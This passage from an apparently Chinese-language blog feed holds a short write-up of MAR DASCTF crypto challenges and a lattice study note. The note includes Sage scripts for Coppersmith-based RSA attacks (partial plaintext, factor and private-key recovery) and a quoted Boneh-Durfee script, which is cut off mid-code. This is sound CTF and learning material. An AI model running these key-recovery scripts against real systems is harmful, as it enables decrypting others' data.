    <title>Writeup for MAR DASCTF&#39;s crypto</title>
    <link href="http://example.com/2021/03/27/Writeup_for_MAR_DASCTF&#39;s_crypto/"/>
    <id>http://example.com/2021/03/27/Writeup_for_MAR_DASCTF&#39;s_crypto/</id>
    <published>2021-03-27T10:30:26.000Z</published>
    <updated>2021-03-27T10:21:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-MAR-DASCTF’s-crypto"><a href="#Writeup-for-MAR-DASCTF’s-crypto" class="headerlink" title="Writeup for MAR DASCTF’s crypto"></a>Writeup for MAR DASCTF’s crypto</h1><h2 id="crypto-threshold"><a href="#crypto-threshold" class="headerlink" title="crypto_threshold"></a>crypto_threshold</h2><p>签到题，给了LCG的所有参数，而且求的还是后一位，求得 $e$</p><p>RSA部分给的<code>_lambda</code>和我上次出的VNCTF的<code>hint</code>是一个样子，求得明文</p><h2 id="FeedBack"><a href="#FeedBack" class="headerlink" title="FeedBack"></a>FeedBack</h2><p>给了个函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">cycle</span>(<span class="params">c:<span class="built_in">list</span>,a:<span class="built_in">list</span></span>)-&gt;<span class="built_in">int</span>:</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x,y: x+y,<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x[<span class="number">0</span>]*x[<span class="number">1</span>],<span class="built_in">zip</span>(c,a)))</span><br></pre></td></tr></table></figure><p>功能就是把 $c$ 和 $a$ 两两相乘再相加</p><p>显然如果有 $key$ ，逆推回去就很容易，那么就想办法找 $key$ 的关系，因为有<br>$$<br>c &#x3D; \sum_{i&#x3D;1}^{lenth}m_i\cdot key_i<br>$$<br>结合数据即<br>$$<br>{\begin{bmatrix}<br>x_1&amp;x_2&amp;x_3&amp;\cdots&amp;x_n \\<br>x_2&amp;x_3&amp;x_4&amp;\cdots&amp;x_{n+1} \\<br>\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>x_n&amp;x_{n+1}&amp;x_{n+2}&amp;\cdots&amp;x_{2n} \\<br>\end{bmatrix}}<br>\cdot<br>{\begin{bmatrix}<br>key_1 \\<br>key_2 \\<br>\vdots \\<br>key_n \\<br>\end{bmatrix}}<br>&#x3D;<br>{\begin{bmatrix}<br>x_{n+1}&amp;x_{n+2}&amp;x_{n+3}&amp;\cdots&amp;x_{2n}<br>\end{bmatrix}}<br>$$<br>拿到 $key$ 之后，<del>想怎么做怎么做</del></p><h2 id="son-of-NTRU"><a href="#son-of-NTRU" class="headerlink" title="son_of_NTRU"></a>son_of_NTRU</h2><p>数字类的NTRU，甚至是原题，抄起之前的exp直接就秒了（</p><p>NTRU原理不多说了，对矩阵<br>$$<br>M&#x3D;<br>{\begin{bmatrix}<br>h&amp;1\\<br>p&amp;0<br>\end{bmatrix}}<br>$$<br>一定存在一个向量 $\vec{v}&#x3D;(f,-k)$ 满足<br>$$<br>\vec{v}\cdot M&#x3D;\vec{x}&#x3D;(g,f)<br>$$<br>而且是最短的，格基规约后就能拿到 $g$ 和 $f$ 了</p><h2 id="threshold"><a href="#threshold" class="headerlink" title="threshold"></a>threshold</h2><p><del>还nm是个NTRU，出题人是有多喜欢NTRU</del></p><p>多项式下的NTRU，构造矩阵<br>$$<br>B&#x3D;<br>{\begin{bmatrix}<br>\pmb{1}&amp;\pmb{h(x)} \\<br>\pmb{0}&amp;\pmb{q}<br>\end{bmatrix}}<br>$$</p><p>格基规约后拿最短的作为新的 $f(x)$ 和 $g(x)$ 重新实现一下解密就能求得 $m(x)$ </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Writeup-for-MAR-DASCTF’s-crypto&quot;&gt;&lt;a href=&quot;#Writeup-for-MAR-DASCTF’s-crypto&quot; class=&quot;headerlink&quot; title=&quot;Writeup for MAR DASCTF’s crypt</summary>
      
    
    
    
    <category term="Writeup" scheme="http://example.com/categories/Writeup/"/>
    
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Writeup" scheme="http://example.com/tags/Writeup/"/>
    
  </entry>
  
  <entry>
    <title>Lattice learning 2</title>
    <link href="http://example.com/2021/03/18/Lattice_learning2/"/>
    <id>http://example.com/2021/03/18/Lattice_learning2/</id>
    <published>2021-03-18T08:19:25.000Z</published>
    <updated>2021-04-03T08:56:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Lattice-learning-2"><a href="#Lattice-learning-2" class="headerlink" title="Lattice learning 2"></a>Lattice learning 2</h1><blockquote><p>这篇博客refer的东西太多了，所以要看别的师傅的版本的话可以转路友链里的密码师傅们</p></blockquote><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>格子真是好玩的东西，但是看得再多的博客也不如自己亲自调几个格子来的清楚，比如各种优化或者约束</p><h2 id="Chapher-5-Encryption-mode-in-Lattice"><a href="#Chapher-5-Encryption-mode-in-Lattice" class="headerlink" title="Chapher 5 Encryption mode in Lattice"></a>Chapher 5 Encryption mode in Lattice</h2><h3 id="Coppersmith"><a href="#Coppersmith" class="headerlink" title="Coppersmith"></a>Coppersmith</h3><p>Coppersmith是啥？</p><p><del>铜匠！炼铜！</del></p><p><img src="/img/Lattice_learning/4.png" alt="Coppersmith"></p><p>在我看来就是一种在有限域内解方程的方法，比方说 $f(x)&#x3D;x^4+114x+514$ 且对于有特殊关系的 $x_0$ 满足关系 $f(x_0)\equiv0\pmod{N}$ ，去求解这样的 $x_0$ 时我们可以使用Coppersmith’s methed。对于度为 $d$ 的多项式 $f(x)$ ，如果这个 $x_0$ 满足 $|x0|&lt; N^{\frac{1}{d}-\varepsilon}$ ，那么就能在多项式的时间内被找出。</p><blockquote><p>假设 $N$ 是一个未知因子组成的数，且存在一个因子 $b\geq N^\beta(0&lt;\beta\leq 1)$ ，$f(x)$ 是一个一元一次 $d$ 阶的多项式，且 $c\geq 1$ ，那么可以在 $O(cd^5log^9(N))$ 的复杂度内求解所有的 $x_0$ 。</p><p>$f(x_0)&#x3D;0\pmod{b},x_0\leq cN^{\frac{\beta^2}{d}}$</p></blockquote><blockquote><p>这里关于证明，等我有时间<del>把高等代数学会了再</del>回来证</p></blockquote><p>线性代数中我们学过：任何的函数都可以被写成一个基函数的样子，当然求导也是一种线性变换，如下图：<br>$$<br>Basis~functions{&#x3D;\begin{bmatrix}<br>1\\x\\x^2\\x^3\\\vdots<br>\end{bmatrix}}<br>~~<br>\frac{d}{dx}&#x3D;<br>{\begin{bmatrix}<br>0&amp;1&amp;0&amp;0&amp;\cdots\\<br>0&amp;0&amp;2&amp;0&amp;\cdots\\<br>0&amp;0&amp;0&amp;3&amp;\cdots\\<br>0&amp;0&amp;0&amp;0&amp;\cdots\\<br>\vdots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots<br>\end{bmatrix}}<br>$$<br>说了这么多，Coppersmith到底是干嘛的？对于一元Coppersmith，它的作用就是找出一个 $F(x)&#x3D;A\cdot f(x)-N\cdot g(x)$ ，这样就能利用牛顿法求出使得 $F(x)&#x3D;0$ 的 $x_0$ ，那么此时 $f(x_0)\equiv0$ 也是显而易见的了。</p><p>我们不妨把函数 $f(x)&#x3D;x^d+a_{d-1}x^{d-1}+\cdots+a_1x+a_0$ 表示成一个类似基函数的向量： $\vec{a}&#x3D;(a_0,xa_1,x^2a_2,\cdots,x^da_d)$ ，那么只要 $||\vec{a}||&lt;\frac{N}{\sqrt{d+1}}$ 且 $F(x_0)\equiv0\pmod{N}$ ，就有 $f(x_0)\equiv0$ ，关于Coppersmith的证明和界的扩大方法这里指路V神的博客。</p><h4 id="已知部分明文攻击"><a href="#已知部分明文攻击" class="headerlink" title="已知部分明文攻击"></a>已知部分明文攻击</h4><p>设 $m&#x3D;m_0+x$ ，我们可以找到 $f(x)&#x3D;(m_0+x)^e-c\pmod{N}$ ，当 $e$ 和 $x$ 较小时，Coppersmith即可计算出 $x$ 的值</p><blockquote><p>$b&#x3D;N,d&#x3D;e,\beta&#x3D;1$ 则 $|x|\leq cN^{\frac{\beta^2}{d}}&#x3D;cN^{\frac{1}{e}}$ ，因此为了求解，我们至少需要知道关于m至少 $(1-\frac{1}{e})\cdot N.bit_length()$ bit的信息</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">e = </span><br><span class="line">c = </span><br><span class="line">n = </span><br><span class="line">kbits = <span class="comment"># unknow x bit</span></span><br><span class="line">m0 = </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="comment"># f(x)</span></span><br><span class="line">f = f.monic()</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits,beta=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(x0)</span><br></pre></td></tr></table></figure><h4 id="已知部分因子攻击"><a href="#已知部分因子攻击" class="headerlink" title="已知部分因子攻击"></a>已知部分因子攻击</h4><p>设 $p&#x3D;p_0+x$ ， $f(x)&#x3D;p_0+x$ 此时我们把 $N$ 看做 $k\cdot p$ ，又因为 $-p_0\equiv x\pmod{p}$ ，则可以找到 $K\cdot f(x)-M\cdot p&#x3D;0$</p><blockquote><p>$b&#x3D;p$ ，且RSA中 $p$ 和 $q$ 通常是满足 $p&lt;q&lt;2p$ 所以 $p\approx N^{0.4}$ ，也就是说 $\beta&#x3D;0.4$ 附近较为适合，另外 $|x|&lt;N^{\frac{1}{3}}$ ，我们只要知道 $p$ 一半bit就可以求出这样的 $x$ 。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">n = </span><br><span class="line">p0 = </span><br><span class="line">kbits = </span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = <span class="comment"># f(x)</span></span><br><span class="line"><span class="comment"># f = f.monic()</span></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]</span><br><span class="line">p = x0 + p0</span><br><span class="line"><span class="built_in">print</span>(p)</span><br></pre></td></tr></table></figure><h4 id="已知部分私钥攻击"><a href="#已知部分私钥攻击" class="headerlink" title="已知部分私钥攻击"></a>已知部分私钥攻击</h4><p>来自论文《An Attack on RSA Given a Small Fraction of the Private Key Bits》</p><p>设 $d&#x3D;d_0+x$ ，且 $d_0$ 是私钥 $d$ 的kbits低位，那么显然 $d_0\equiv d\pmod{2^{kbits}}$ ，那么有 $e\cdot d_0&#x3D;e\cdot d&#x3D;1+k\cdot\varphi(N)&#x3D;1+k(N-(p+q)+1)\pmod{2^{kbits}}$ ，</p><p>则通过解方程 $e\cdot d_0\cdot X-k\cdot X\cdot(N-X+1)&#x3D;X$ 就可以得到所有可能的 $i\cdot p+j\cdot q\pmod{2^{kbits}}$ 的值，接着再求解 $p^2-xp+N&#x3D;0\pmod{2^{kbits}}$ 即可得到 $p$ 的低位值，将上面两个式子联立，即只需要解一个方程 $e\cdot d_0\cdot X - k\cdot X\cdot(n-X+1) + k\cdot n &#x3D;&#x3D; X$ 即可得到低位的 $p$ </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">partial_p</span>(<span class="params">p0, kbits, n</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">n = </span><br><span class="line">e = </span><br><span class="line">d = </span><br><span class="line">nbits = n.nbits()</span><br><span class="line">kbits = d.nbits()</span><br><span class="line"></span><br><span class="line">p = find_p(d, kbits, e, n)</span><br><span class="line">q = n//p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p = %d&quot;</span> % p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q = %d&quot;</span> % q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d0 = %d&quot;</span> % d)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d = %d&quot;</span> % inverse_mod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h3 id="多消息攻击"><a href="#多消息攻击" class="headerlink" title="多消息攻击"></a>多消息攻击</h3><h4 id="线性相关消息攻击"><a href="#线性相关消息攻击" class="headerlink" title="线性相关消息攻击"></a>线性相关消息攻击</h4><p>已知 $c1&#x3D;m^e\pmod{N}$ ， $c2&#x3D;(a\cdot m+b)^e\pmod{N}$</p><blockquote><p>首先用 $e&#x3D;3$ 举个栗子，我们可以通过构造 $m&#x3D;\frac{m\cdot f(m)}{f(m)}$ 的格式来求 $m$ ，比方说 $e&#x3D;3$ 时，我们能构造 $m&#x3D;\frac{b}{a}\cdot\frac{c_2+2a^3c_1-b^3}{c_2-a^3c_1+2b^3}$ </p></blockquote><p>关于更高维的，<del>等我学会就来写</del>，这里指路<a href="https://link.springer.com/content/pdf/10.1007%2F3-540-68339-9_1.pdf">《Low-Exponent RSA with Related Messages》</a></p><h4 id="多消息相关攻击"><a href="#多消息相关攻击" class="headerlink" title="多消息相关攻击"></a>多消息相关攻击</h4><p>Waiting for undate……</p><h4 id="Hastad广播攻击"><a href="#Hastad广播攻击" class="headerlink" title="Hastad广播攻击"></a>Hastad广播攻击</h4><p>Waiting for undate……</p><h4 id="SMUPE攻击"><a href="#SMUPE攻击" class="headerlink" title="SMUPE攻击"></a>SMUPE攻击</h4><p>Waiting for undate……</p><h3 id="Boneh-and-Durfee-attack"><a href="#Boneh-and-Durfee-attack" class="headerlink" title="Boneh and Durfee attack"></a>Boneh and Durfee attack</h3><p>Waiting for undate……</p><p>先放一个别人的版本，等后面自己实现完了之后来换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 2020/10/31 23:37</span></span><br><span class="line"><span class="comment"># @Author : A.James</span></span><br><span class="line"><span class="comment"># @FileName: tt6.py</span></span><br><span class="line"><span class="comment"># @Email : alexjames@sina.com</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Config</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting debug to true will display more informations</span></span><br><span class="line"><span class="string">about the lattice, the bounds, the vectors...</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Setting strict to true will stop the algorithm (and</span></span><br><span class="line"><span class="string">return (-1, -1)) if we don&#x27;t have a correct </span></span><br><span class="line"><span class="string">upperbound on the determinant. Note that this </span></span><br><span class="line"><span class="string">doesn&#x27;t necesseraly mean that no solutions </span></span><br><span class="line"><span class="string">will be found since the theoretical upperbound is</span></span><br><span class="line"><span class="string">usualy far away from actual results. That is why</span></span><br><span class="line"><span class="string">you should probably use `strict = False`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">strict = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">This is experimental, but has provided remarkable results</span></span><br><span class="line"><span class="string">so far. It tries to reduce the lattice as much as it can</span></span><br><span class="line"><span class="string">while keeping its efficiency. I see no reason not to use</span></span><br><span class="line"><span class="string">this option, but if things don&#x27;t work, you should try</span></span><br><span class="line"><span class="string">disabling it</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">helpful_only = <span class="literal">True</span></span><br><span class="line">dimension_min = <span class="number">7</span>  <span class="comment"># stop removing if lattice reaches that dimension</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"><span class="comment"># Functions</span></span><br><span class="line"><span class="comment">##########################################</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># display stats on helpful vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">helpful_vectors</span>(<span class="params">BB, modulus</span>):</span><br><span class="line">    nothelpful = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> (nothelpful, <span class="string">&quot;/&quot;</span>, BB.dimensions()[<span class="number">0</span>], <span class="string">&quot; vectors are not helpful&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># display matrix picture with 0 and X</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">matrix_overview</span>(<span class="params">BB, bound</span>):</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii, jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>:</span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="built_in">print</span> (a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># tries to remove unhelpful vectors</span></span><br><span class="line"><span class="comment"># we start at current = n-1 (last vector)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span><br><span class="line">    <span class="comment"># end of our recursive function</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"></span><br><span class="line">    <span class="comment"># we start by checking from the end</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment"># if it is unhelpful:</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">            <span class="comment"># let&#x27;s check if it affects other vectors</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span 